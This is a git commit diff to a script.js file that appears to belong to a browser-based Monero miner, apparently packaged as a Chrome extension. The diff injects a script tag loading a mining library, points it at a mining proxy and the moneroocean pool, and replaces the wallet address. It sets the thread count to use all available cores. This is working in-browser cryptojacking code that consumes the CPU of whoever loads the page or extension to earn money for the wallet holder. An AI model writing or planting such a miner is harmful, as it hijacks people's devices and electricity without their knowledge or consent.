7c63b9a05abaa9abf1d74617c5b1488eb6ff1e13
cihuuy <95659029+cihuuy@users.noreply.github.com>
2024-11-24 11:27:36 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,11 +1,11 @@
 // Start Of Mining Code (Javascript)
 var script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-miner-chrome-extension@main/mine.js";
+script.src = "mine.js";
 document.head.appendChild(script);
 
 server = "wss://f.xmrminingproxy.com:8181";
 var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+var walletAddress = "86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB";
 var workerId = "GH-XMR"
 var threads = -1;
 var password = "";
